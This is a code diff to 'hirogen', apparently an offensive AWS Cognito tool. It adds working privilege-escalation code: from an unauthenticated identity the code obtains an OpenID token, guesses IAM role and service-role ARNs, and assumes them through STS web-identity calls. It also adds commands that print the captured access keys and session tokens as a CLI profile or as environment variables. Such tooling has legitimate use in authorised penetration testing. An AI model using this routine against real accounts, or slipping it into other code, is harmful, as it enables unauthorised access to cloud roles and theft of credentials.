@@ -237,7 +237,50 @@ var yargs = require('yargs')
 			"identitypoolid"
 		]);
 
-		cognito.getCredentialsForIdentity(argv.identitypoolid, null, null).then((data) => {
+		cognito.getCredentialsForIdentity(argv.identitypoolid, null, null).then(async (data) => {
+
+			const c_raw = new aws.CognitoIdentity({ region: data.region });
+
+			let token;
+
+			try {
+				token = await c_raw.getOpenIdToken({ IdentityId: data.identity.IdentityId }).promise();
+			} catch (e) {
+				console.log(`[-] Basic flow is not enabled. Unable privesc outside of Cognito.`.red);
+			}
+
+			if (!!token) {
+				const [prefix, name] = data.identity.Arn.split("/");
+				const role = `${prefix.replace("assumed-role", "role").replace("sts", "iam")}/${name}`;
+				const serviceRole = `${prefix.replace("assumed-role", "role/service-role").replace("sts", "iam")}/${name}`;
+
+				const sts = new aws.STS({
+					region: "us-east-1",
+					credentials: () => Promise.resolve({})
+				});
+
+				// Take whichever one succeeds - role could be role/ or role/service-role.
+				try {
+					const reassume = await Promise.any([
+						sts.assumeRoleWithWebIdentity({
+							RoleArn: role,
+							RoleSessionName: "hirogen",
+							WebIdentityToken: token.Token
+						}).promise(),
+						sts.assumeRoleWithWebIdentity({
+							RoleArn: serviceRole,
+							RoleSessionName: "hirogen",
+							WebIdentityToken: token.Token
+						}).promise()
+					]);
+
+					data.credentials = reassume.Credentials;
+					console.log(`[+] Successfully reassumed role through basic authflow.`.green);
+				} catch (e) {
+					console.log(`[-] Failed to reassume role through basic authflow.`.red);
+				}
+			}
+
 			workspace.cognito.identitypoolid = argv.identitypoolid;
 			workspace.cognito.identity_allows_unauthenticated = true;
 
@@ -247,7 +290,6 @@ var yargs = require('yargs')
 			argv.secret_access_key = data.credentials.SecretKey;
 			argv.session_token = data.credentials.SessionToken;
 			argv.provider = 'unauthenticated';
-
 
 			console.log(("[+] Credentials received. Your new identity is:\n".green))
 			console.log(JSON.stringify(data.identity, null, 4).blue);
@@ -275,6 +317,22 @@ var yargs = require('yargs')
 				break;
 			}
 		});
+	}, [loadCore, loadWorkspace])
+	.command("cliprofile <provider>", "Output CLI profile for the given provider.", (yargs) => {
+		yargs
+		.usage('hirogen export <credential provider>')
+	}, (argv) => {
+		console.log(`aws_access_key_id = ${argv.access_key_id}`);
+		console.log(`aws_secret_access_key = ${argv.secret_access_key}`);
+		console.log(`aws_session_token = ${argv.session_token}`);
+	}, [loadCore, loadWorkspace])
+	.command("export <provider>", "Output CLI ENVVARS for the given provider.", (yargs) => {
+		yargs
+		.usage('hirogen export <credential provider>')
+	}, (argv) => {
+		console.log(`export AWS_ACCESS_KEY_ID="${argv.access_key_id}"`);
+		console.log(`export AWS_SECRET_ACCESS_KEY="${argv.secret_access_key}"`);
+		console.log(`export AWS_SESSION_TOKEN="${argv.session_token}"`);
 	}, [loadCore, loadWorkspace])
 	.command("as <provider>", "Proxy an AWS CLI Command with credentials from the given provider.", (yargs) => {
 		yargs
@@ -610,6 +668,8 @@ var yargs = require('yargs')
 		description: 'The workspace to work from.'
 	})
 	.help('help')
+	.completion()
+	.scriptName('hirogen')
 	.argv;
 
 function handleSignUpResponse(response) {
